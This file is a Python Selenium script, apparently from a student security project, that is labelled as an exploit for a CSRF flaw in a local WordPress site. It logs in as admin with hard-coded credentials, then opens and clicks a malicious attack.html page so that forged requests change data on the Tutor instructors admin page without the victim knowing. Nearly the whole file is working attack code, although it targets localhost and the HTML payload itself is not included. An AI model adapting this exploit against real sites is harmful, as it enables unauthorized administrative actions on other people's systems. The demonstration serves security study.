#exploit program for the CSRF vulnerability
#before running, install selenium library by executing: pip install selenium
#run it with Python by executing: python attack.py

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

#set credentials
username = "admin"
password = "pass"
#set local host admin page and homepage
localhost_admin = "http://127.0.0.1/wp/wp-admin"
localhost_website = "http://127.0.0.1/wp"

#the webdriver uses firefox to navigate the web pages

#user has already to be logged in the website
driver = webdriver.Firefox()
#visit website
driver.get(localhost_admin)

#insert username and password
username_field = driver.find_element_by_id("user_login")
username_field.send_keys(username)

password_field = driver.find_element_by_id("user_pass")
password_field.send_keys(password)

#log in
driver.find_element_by_id("wp-submit").click()

#admin is logged in to the website

#begin of the attack

#open the malicious HTML file
# // modify location of the folder where attack.html file is saved //
driver.get("file:///home/chiara/github/InformationSecurityProject/csrf%20exploit/attack.html")

#after clicking on the page, the malicious code is executed and the
#harmful actions are performed by victim without him knowing
malicious_click = driver.find_element_by_id("attack_div")
malicious_click.click()

#redirection to homepage
driver.get(localhost_website)

#end of the attack

#visit:
#http://localhost/wp/wp-admin/admin.php?page=tutor-instructors
#to see the changes.
